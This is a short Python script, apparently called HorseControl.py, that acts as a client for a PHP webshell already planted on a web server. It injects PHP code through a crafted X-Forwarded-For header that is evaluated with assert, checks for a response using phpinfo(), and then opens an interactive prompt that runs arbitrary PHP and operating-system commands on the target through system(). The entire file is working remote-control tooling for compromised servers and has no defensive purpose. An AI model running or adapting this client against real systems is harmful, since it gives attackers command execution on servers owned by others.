import requests
import sys


def check_url_exist(url):
    header = {
        'X-Forwarded-For': 'index=assert&endex=phpinfo()'
    }
    result = requests.get(url, headers=header)
    if 'PHP Version' in result.text:
        return True
    else:
        return False


def InputShell(url):
    if check_url_exist(url):
        systeminfo = ExecConfig(url, "print_r(php_uname('s'))")
        print('Shell Connect OK,The Server is based on {0} ,Have Fun!'.format(systeminfo))
        while 1:
            func = input('[#]>')
            if func == 'shell':
                print('[#]>Change To OS-Shell')
                while 1:
                    func = input('[+]>')
                    if func == 'quit':
                        func = ''
                        break
                    print(ExecConfig(url, 'system(\'' + func + '\')'))
            if func == 'quit':
                exit(print('Thank you for using!'))
            ExecConfig(url, func)


def ExecConfig(url, config):
    header = {
        'X-Forwarded-For': 'index=assert&endex={0}'.format(config)
    }
    result = requests.get(url, headers=header)
    return result.text


if __name__ == '__main__':
    if (len(sys.argv) == 2):
        InputShell(sys.argv[1])
    else:
        exit(print('The Correct Usage Is: HorseControl.py http://xxx.com/shell.php'))
